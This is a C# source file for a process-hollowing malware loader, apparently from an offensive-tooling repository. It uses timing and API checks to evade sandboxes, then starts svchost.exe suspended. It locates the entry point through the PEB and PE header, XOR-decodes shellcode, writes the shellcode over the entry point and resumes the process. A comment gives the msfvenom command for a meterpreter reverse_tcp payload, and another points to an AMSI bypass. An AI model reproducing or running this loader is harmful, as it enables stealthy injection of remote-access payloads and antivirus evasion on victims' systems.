// this is a Process hollowing executable, a regular shellcode runner and amsi bypass in powershell can be found in the root of this repo
﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace ProcHollow
{
    class Program
    {
        // http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        // http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        // https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
        static uint CREATE_SUSPENDED = 0x00000004;

        // https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
        static int ProcessBasicInformation = 0x00000000;
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            // 1 -- Create the target process in a suspended state
            DateTime t1 = DateTime.Now; Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }

/*            string name = "rev";
            if (Path.GetFileNameWithoutExtension(Environment.GetCommandLineArgs()[0])!=name) {
                return;
            }*/



            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

            CreateProcess(
                "C:\\Windows\\System32\\svchost.exe",
                "",
                ref sa,
                ref sa,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            Console.WriteLine("[1] Created suspended 'svchost.exe' with ProcId " + pi.dwProcessId);

            // 2 -- Get the address of the Process Environment Block

            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            uint retlen = 0;
            ZwQueryInformationProcess(
                pi.hProcess,
                ProcessBasicInformation,
                ref pbi,
                (uint)(IntPtr.Size * 6),
                ref retlen
            );

            Console.WriteLine("[2] PEB is at 0x{0}", pbi.PebAddress.ToString("X"));

            // 3 -- Extract the Image Base Address from the PEB

            byte[] buf1 = new byte[0x8];
            IntPtr numBytesRead = IntPtr.Zero;

            ReadProcessMemory(
                pi.hProcess,
                pbi.PebAddress + 0x10,
                buf1,
                0x8,
                out numBytesRead
            );
            IntPtr imageBaseAddress = (IntPtr)BitConverter.ToInt64(buf1, 0);

            Console.WriteLine("[3] Image Base Address is 0x{0}", imageBaseAddress.ToString("X"));

            // 4 -- Read the PE structure to find the EntryPoint address

            byte[] buf2 = new byte[0x200];

            ReadProcessMemory(
                pi.hProcess,
                imageBaseAddress,
                buf2,
                0x200,
                out numBytesRead
            );

            uint e_lfanew = BitConverter.ToUInt32(buf2, 0x3c);
            uint entryPointRVAOffset = e_lfanew + 0x28;
            uint entryPointRVA = BitConverter.ToUInt32(buf2, (int)entryPointRVAOffset);
            IntPtr entryPointAddr = (IntPtr)((UInt64)imageBaseAddress + entryPointRVA);

            IntPtr entryPoint = IntPtr.Zero;
            Console.WriteLine("[4] Entry Point is 0x{0}", entryPointAddr.ToString("X"));

            // this is a Process hollowing executable, a regular shellcode runner and amsi bypass in powershell can be found in the root of this repo
            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443  -f csharp --encrypt xor --encrypt-key a
            byte[] shellcode = new byte[510] {<Shellcode>};


            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)(shellcode[i] ^ 'a');
            }

            WriteProcessMemory(
                pi.hProcess,
                entryPointAddr,
                shellcode,
                shellcode.Length,
                out numBytesRead
            );

            Console.WriteLine("[5] Wrote to Entry Point");

            // 6 -- Resume the target process

            ResumeThread(pi.hThread);

            Console.WriteLine("[6] Resumed process thread");
        }
    }
}
